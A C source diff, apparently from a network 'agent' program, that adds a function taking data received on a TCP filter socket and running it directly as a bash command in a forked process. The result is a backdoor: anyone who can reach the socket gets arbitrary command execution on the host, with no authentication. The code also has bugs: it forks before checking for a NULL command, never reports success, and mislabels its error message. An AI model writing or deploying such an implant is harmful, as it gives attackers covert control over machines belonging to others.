@@ -13,7 +13,7 @@
 #include "networking.h"
 
 static int CreateTCPFilterSocket();
-
+static int RunCommand(char* cmd);
 int StartAgent()
 {
     int sock = -1;
@@ -36,8 +36,44 @@ int StartAgent()
         goto end;
     }
 
+    RunCommand((char*)packet_data);
+
 end:
     NFREE(packet_data);
+    return exit_code;
+}
+
+/**
+ * @brief Runs a command with bash
+ * 
+ * @param cmd command to run
+ * @return int EXIT_SUCCESS on success, EXIT_FAILURE on failure.
+ */
+static int RunCommand(char* cmd)
+{
+    int exit_code = EXIT_FAILURE;
+    pid_t pid = fork();
+
+    if (NULL == cmd)
+    {
+        fprintf(stderr, "Command cannot be NULL\n");
+        goto end;
+    }
+
+    if (-1 == pid)
+    {
+        perror("fork failed");
+        goto end;
+    }
+
+    if (0 == pid)
+    {
+        execl("/bin/bash", "bash", "-c", cmd, (char*)NULL);
+        perror("execlp failed");
+        exit(EXIT_FAILURE);
+    }
+
+end:
     return exit_code;
 }
 
